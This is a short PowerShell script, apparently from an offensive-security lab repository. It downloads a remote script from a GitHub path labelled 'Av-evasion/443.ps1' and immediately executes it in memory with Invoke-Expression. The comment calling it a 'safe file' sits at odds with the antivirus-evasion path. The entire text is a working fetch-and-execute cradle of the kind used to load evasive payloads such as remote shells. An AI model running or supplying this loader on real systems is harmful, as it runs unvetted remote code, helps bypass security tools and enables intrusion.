# URL to download safe file
$scriptUrl = "https://raw.githubusercontent.com/salahgeek/LAB/main/LAS/Av-evasion/443.ps1"
# Download script
$scriptBytes = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -Method Get -MaximumRedirection 0 
$scriptContent = [System.Text.Encoding]::UTF8.GetString($scriptBytes.Content)
# Run the script
Invoke-Expression -Command $scriptContent





